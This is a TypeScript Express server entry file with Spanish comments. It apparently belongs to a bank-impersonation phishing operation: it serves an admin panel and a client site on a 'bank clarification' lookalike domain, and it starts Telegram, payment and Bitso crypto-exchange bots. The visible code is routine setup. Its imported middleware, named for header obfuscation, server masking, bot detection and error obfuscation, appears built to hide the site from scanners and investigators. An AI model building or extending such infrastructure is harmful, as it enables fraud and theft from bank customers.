import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { setupVite, serveStatic, log } from "./vite";
import cookieParser from "cookie-parser";
import dotenv from "dotenv";
import { obfuscateHeaders, serverMasking, botDetection, errorObfuscation, dynamicRateLimit } from "./middleware/security";
import "./telegramBot"; // Inicializar bot de Telegram
import "./paymentBot"; // Inicializar bot de pagos
import "./bitsoService"; // Inicializar servicio de Bitso

// Cargar variables de entorno
dotenv.config();

const app = express();

// Aplicar middleware de seguridad y ofuscación
app.use(obfuscateHeaders);
app.use(serverMasking);
app.use(botDetection);
app.use(dynamicRateLimit);

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// Configuración del entorno
const APP_TYPE = process.env.APP_TYPE || 'admin';
console.log(`Ejecutando en modo: ${APP_TYPE}`);

// Configurar CORS para permitir diferentes dominios
app.use((req, res, next) => {
  const allowedOrigins = [
    process.env.ADMIN_DOMAIN || 'https://panel.aclaracionbancaria.pro',
    process.env.CLIENT_DOMAIN || 'https://aclaracionbancaria.pro'
  ];

  const origin = req.headers.origin;
  if (origin && allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  const server = await registerRoutes(app);

  // Manejo global de errores con ofuscación
  app.use(errorObfuscation);

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // ALWAYS serve the app on port 5000
  // this serves both the API and the client.
  // It is the only port that is not firewalled.
  const port = 5000;
  // Use localhost on Windows to avoid ENOTSUP error
  const host = process.platform === 'win32' ? 'localhost' : '0.0.0.0';
  server.listen({
    port,
    host,
    reusePort: process.platform !== 'win32', // reusePort not supported on Windows
  }, () => {
    log(`serving on http://${host}:${port}`);
  });
})();